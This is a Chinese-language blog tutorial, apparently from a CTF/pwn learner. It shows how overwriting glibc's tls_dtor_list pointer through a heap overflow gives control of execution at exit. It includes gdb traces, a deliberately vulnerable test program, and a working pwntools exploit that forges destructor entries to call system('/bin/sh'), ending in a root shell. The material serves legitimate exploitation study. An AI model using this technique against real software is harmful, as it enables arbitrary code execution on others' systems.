---
title: Playing with tls_dtor_list
date: 2017-03-27 01:03:47
tags:
- tls_dtor_list
- heap overflow
categories:
- heap_exploit
---

## Preview
记得以前刷pwn题的时候有碰到覆盖tls_dtor_list的技术，那时候不是很懂，所以也没有去仔细研究(还有技术太渣.....)。最近比较闲，所以就打算把这个老问题拿出来彻底解决一下。

## tls_dtor_list
首先弄明白tls_dtor_list是什么。
tls_dtor_list是一个指针，声明如下：
<!-- more -->
```c
typedef void (*dtor_func) (void *);

struct dtor_list
{
  dtor_func func;
  void *obj;
  struct link_map *map;
  struct dtor_list *next;
};

static __thread struct dtor_list *tls_dtor_list;
```
dtor_list结构中func是一个带有obj参数的函数，map是跟动态链接有关的结构体，next指向下一个dtor_list结构体。
其实关键还得看这个结构体是干什么用的。一般来说程序在结束时总会执行exit()函数，就算是main函数没有显示调用exit()函数，在main函数返回后程序还是会执行exit()函数。而exit()函数最终会执行下面的__call_tls_dtors()函数，此函数会依次执行dtor_list链表中的每个节点里的func函数。
```c
void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      tls_dtor_list = tls_dtor_list->next;

      cur->func (cur->obj);

      __rtld_lock_lock_recursive (GL(dl_load_lock));

      /* Allow DSO unload if count drops to zero.  */
      cur->map->l_tls_dtor_count--;
      if (cur->map->l_tls_dtor_count == 0 && cur->map->l_type == lt_loaded)
        cur->map->l_flags_1 &= ~DF_1_NODELETE;

      __rtld_lock_unlock_recursive (GL(dl_load_lock));

      free (cur);
    }
}
```
为了一探究竟，我们来跟踪一下exit()函数。
首先main函数执行完后返回到\__libc_start_main()函数中，接着会执行__GI_exit()函数：
```shell
   0x7ffff7a36f3b <__libc_start_main+235>:	mov    rdx,QWORD PTR [rax]
   0x7ffff7a36f3e <__libc_start_main+238>:	mov    rax,QWORD PTR [rsp+0x18]
   0x7ffff7a36f43 <__libc_start_main+243>:	call   rax  /*address of main*/
=> 0x7ffff7a36f45 <__libc_start_main+245>:	mov    edi,eax
   0x7ffff7a36f47 <__libc_start_main+247>:	call   0x7ffff7a511e0 <__GI_exit>
   0x7ffff7a36f4c <__libc_start_main+252>:	xor    edx,edx
   0x7ffff7a36f4e <__libc_start_main+254>:	jmp    0x7ffff7a36e89 <__libc_start_main+57>
   0x7ffff7a36f53 <__libc_start_main+259>:	
    mov    rax,QWORD PTR [rip+0x3a20f6]        # 0x7ffff7dd9050 <__libc_pthread_functions+400>
```
我们接着跟进去：
```shell
   0x7ffff7a511cb <__run_exit_handlers+251>:	call   0x7ffff7a344f0 <free@plt+48>
   0x7ffff7a511d0 <__run_exit_handlers+256>:	jmp    0x7ffff7a510e7 <__run_exit_handlers+23>
   0x7ffff7a511d5:	data32 nop WORD PTR cs:[rax+rax*1+0x0]
=> 0x7ffff7a511e0 <__GI_exit>:	lea    rsi,[rip+0x3824e1]        # 0x7ffff7dd36c8 <__exit_funcs>
   0x7ffff7a511e7 <__GI_exit+7>:	sub    rsp,0x8
   0x7ffff7a511eb <__GI_exit+11>:	mov    edx,0x1
   0x7ffff7a511f0 <__GI_exit+16>:	call   0x7ffff7a510d0 <__run_exit_handlers>
   0x7ffff7a511f5:	nop    WORD PTR cs:[rax+rax*1+0x0]
```
由上面的指令可知，\__GI_exit()函数然后会调用__run_exit_handlers()函数，我们再跟进去：
```shell
   0x7ffff7a510d4 <__run_exit_handlers+4>:	mov    r12d,edx
   0x7ffff7a510d7 <__run_exit_handlers+7>:	push   rbp
   0x7ffff7a510d8 <__run_exit_handlers+8>:	mov    rbp,rsi
=> 0x7ffff7a510db <__run_exit_handlers+11>:	push   rbx
   0x7ffff7a510dc <__run_exit_handlers+12>:	mov    ebx,edi
   0x7ffff7a510de <__run_exit_handlers+14>:	sub    rsp,0x8
   0x7ffff7a510e2 <__run_exit_handlers+18>:	call   0x7ffff7a517b0 <__GI___call_tls_dtors>
   0x7ffff7a510e7 <__run_exit_handlers+23>:	mov    r13,QWORD PTR [rbp+0x0]
```
这时我们看到了我们得目标函数\__GI___call_tls_dtors()，我们跟进去研究一下其汇编代码，然后可以找到tls_dtor_list指针的地址。
```shell
gdb-peda$ x/30i __GI___call_tls_dtors
=> 0x7ffff7a517b0 <__GI___call_tls_dtors>:	    push   r12
   0x7ffff7a517b2 <__GI___call_tls_dtors+2>:	push   rbp
   0x7ffff7a517b3 <__GI___call_tls_dtors+3>:	push   rbx
   0x7ffff7a517b4 <__GI___call_tls_dtors+4>:	lea    rdi,[rip+0x3815d5]        # 0x7ffff7dd2d90
   0x7ffff7a517bb <__GI___call_tls_dtors+11>:	call   0x7ffff7a344a0 <_dl_find_dso_for_object@plt>
   0x7ffff7a517c0 <__GI___call_tls_dtors+16>:	mov    rbx,QWORD PTR [rax+0x60]  /*point*/
   0x7ffff7a517c7 <__GI___call_tls_dtors+23>:	test   rbx,rbx
   0x7ffff7a517ca <__GI___call_tls_dtors+26>:	je     0x7ffff7a51868 <__GI___call_tls_dtors+184>
   0x7ffff7a517d0 <__GI___call_tls_dtors+32>:	mov    rbp,QWORD PTR [rip+0x381611]        # 0x7ffff7dd2de8
   0x7ffff7a517d7 <__GI___call_tls_dtors+39>:	lea    r12,[rbp+0x908]
   0x7ffff7a517de <__GI___call_tls_dtors+46>:	jmp    0x7ffff7a51809 <__GI___call_tls_dtors+89>
   0x7ffff7a517e0 <__GI___call_tls_dtors+48>:	mov    rdi,r12
   0x7ffff7a517e3 <__GI___call_tls_dtors+51>:	call   QWORD PTR [rbp+0xf10]
   0x7ffff7a517e9 <__GI___call_tls_dtors+57>:	mov    rdi,rbx
   0x7ffff7a517ec <__GI___call_tls_dtors+60>:	call   0x7ffff7a344f0 <free@plt+48>
   0x7ffff7a517f1 <__GI___call_tls_dtors+65>:	lea    rdi,[rip+0x381598]        # 0x7ffff7dd2d90
   0x7ffff7a517f8 <__GI___call_tls_dtors+72>:	call   0x7ffff7a344a0 <_dl_find_dso_for_object@plt>
   0x7ffff7a517fd <__GI___call_tls_dtors+77>:	mov    rbx,QWORD PTR [rax+0x60]
   0x7ffff7a51804 <__GI___call_tls_dtors+84>:	test   rbx,rbx
   ......
```
根据源代码对比可知，我们可以知道tls_dtor_list的存储地址了——rax+0x60。需要注意的是一般情况下这个指针的值是NULL。
```shell
gdb-peda$ p/x $rax+0x60
$5 = 0x7ffff7fdf6f0
gdb-peda$ p/x *($rax+0x60)
$6 = 0x0
```
接下来我们要做的事覆盖tls_dtor_list这个指针来执行我们的控制流。

## Exploit
关键是我们怎么来覆盖这个指针，我想为什么这技术用的少是由原因的——因为比较难覆盖。我们先来看一下我们实验程序的内存分布情况。
```shell
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/w0lfzhang/Desktop/a.out
0x00600000         0x00601000         r--p	/home/w0lfzhang/Desktop/a.out
0x00601000         0x00602000         rw-p	/home/w0lfzhang/Desktop/a.out
0x00007ffff7a15000 0x00007ffff7bcf000 r-xp	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7bcf000 0x00007ffff7dcf000 ---p	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7dcf000 0x00007ffff7dd3000 r--p	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7dd3000 0x00007ffff7dd5000 rw-p	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7dd5000 0x00007ffff7dda000 rw-p	mapped
0x00007ffff7dda000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7fdf000 0x00007ffff7fe2000 rw-p	mapped  /*located on this memory area*/
0x00007ffff7ff7000 0x00007ffff7ffa000 rw-p	mapped
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```
对比一下就知道，这个指针的位置在vdso前的map区域，其实就是线程局部存储tls所在的内存页。要想覆盖tls_dtor_list，难度是比较大的。但是也不是没办法，这时我们就要来研究堆的分配了。

### malloc Huge Chunk
当申请的堆块大到不足以在heap segment满足时，glibc会把堆块分配到map区域。
我们来验证一下。
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
  char *b = malloc(0x100);
  char *a = malloc(0x100000);
  printf("address: %p\n", a);
  read(0, a, 0x111111);
  return 0;
}
```
我在程序中malloc(0x100000)，(具体数值不一定要0x100000，只要足够大就可以)然后输出其地址，接着看一下内存布局和tls_dtor_list的地址。
```shell
gdb-peda$ ni
address: 0x7ffff7ede010

gdb-peda$ p/x $rax+0x60  /*address of tls_dtor_list*/
$1 = 0x7ffff7fdf6f0

gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/w0lfzhang/Desktop/tls
0x00600000         0x00601000         r--p	/home/w0lfzhang/Desktop/tls
0x00601000         0x00602000         rw-p	/home/w0lfzhang/Desktop/tls
0x00007ffff7a15000 0x00007ffff7bcf000 r-xp	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7bcf000 0x00007ffff7dcf000 ---p	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7dcf000 0x00007ffff7dd3000 r--p	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7dd3000 0x00007ffff7dd5000 rw-p	/lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff7dd5000 0x00007ffff7dda000 rw-p	mapped
0x00007ffff7dda000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ede000 0x00007ffff7fe2000 rw-p	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 rw-p	mapped
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```
哈哈，glibc把堆块分配到了线程局部存储所在的页之前了。我们计算一下tls_dtor_list指针离堆块尾有多远。
```
0x7ffff7fdf6f0 - (0x7ffff7ede010 + 0x100000) = 0x16E0
```
还好距离不是很远...这样就好办了，如果有堆溢出的话，那我们通过覆盖tls_dtor_list指针和伪造一批dtor_list结构体，我们几乎可以干任何事情。

## Example
我就简单用上面的例子来得到一个shell。虽然平时不会有这种简单的情况，但是引申一下就行了：如果程序会给你一个malloc(len)的选项，(len由用户输入)，而且读入内容部分能造成堆溢出的话，就和这种情况差不多了。
因为主要是要找到tls_dtor_list的地址，而又因为ASLR的影响，其地址在不断变化。所以关键是bypass ASLR，一般方法就只能爆破了。但是只是演示作用，所以我就关了ASLR。

```python
from pwn import *

libc_base_addr = 0x7ffff7a15000
system_addr = libc_base_addr + 0x46590
puts_addr = libc_base_addr + 0x6fd60
binsh_addr = libc_base_addr + 0x17c8c3

p = process('./tls')

p.recvuntil("address: ")
r = p.recvuntil("\n")
mapped_addr = int(r, 16)
print "[*]mapped_addr: " + hex(mapped_addr)

# let's make fake two tls_dtor, one for printing a message--puts('/bin/sh')
# the other for execute system('/bin/sh')
# fake tls_dtor1
payload = p64(0) + p64(0x31) + p64(puts_addr) + p64(binsh_addr) + p64(mapped_addr + 0x100) + p64(mapped_addr + 0x40)

# fake tls_dtor2
payload += p64(0) + p64(0x31) + p64(system_addr) + p64(binsh_addr) + p64(mapped_addr + 0x100) + p64(0)

payload += 'a' * (0x100000 - 0x60 + 0x16E0) + p64(mapped_addr + 0x10)

#raw_input("go?")
p.sendline(payload)

print "pwning...."
print "Got a shell!"
sleep(1)
p.interactive() 
```
我特地构造了两个tls_dtor结构体是觉得因为仅仅构造一个的话中间有些问题可能不会碰到，碰到问题时又得去研究一番。所以就构造多个更能体现这种利用方法的可行性。
好吧，需要注意一个问题。当你仅仅分配一个huge chunk时，main_arena.system_mem等于0。
```shell
gdb-peda$ p main_arena.system_mem 
$1 = 0x0
```
所以当你执行完第一个tls_dtor里面的函数时，会碰到下面的问题：
```shell
*** Error in `./tls': free(): invalid next size (fast): 0x00007ffff7ede020 ***
```
因为__call_tls_dtor函数最后又free(cur)，而free时又会有以下检查：
```c
if (have_lock
	    || ({ assert (locked == 0);
		  mutex_lock(&av->mutex);
		  locked = 1;
		  chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem;
	      }))
	  {
	    errstr = "free(): invalid next size (fast)";
	    goto errout;
	  }
```
所以你可以正常执行完puts('/bin/sh')，但是无法执行system函数。解决办法是先分配一个小的堆块，让ain_arena.system_mem不等于0。
```shell
gdb-peda$ p main_arena.system_mem 
$1 = 0x2100
```
最后执行脚本我们可以得到一个shell。
```shell
root@w0lfzhang666:/home/w0lfzhang/Desktop/TLS# python tls_dtor_list.py
[+] Starting local process './tls': Done
[*]mapped_addr: 0x7ffff7ede010
pwning....
Got a shell!
[*] Switching to interactive mode
/bin/sh
$ id
uid=0(root) gid=0(root) groups=0(root)
$  
```
这种方法利用起来虽然有那么一点困难，但是一旦能覆盖tls_dtor_list指针，那就几乎可以随心所欲的"做坏事"了。


## Links
https://github.com/sploitfun/lsploits/blob/master/glibc/stdlib/cxa_thread_atexit_impl.c
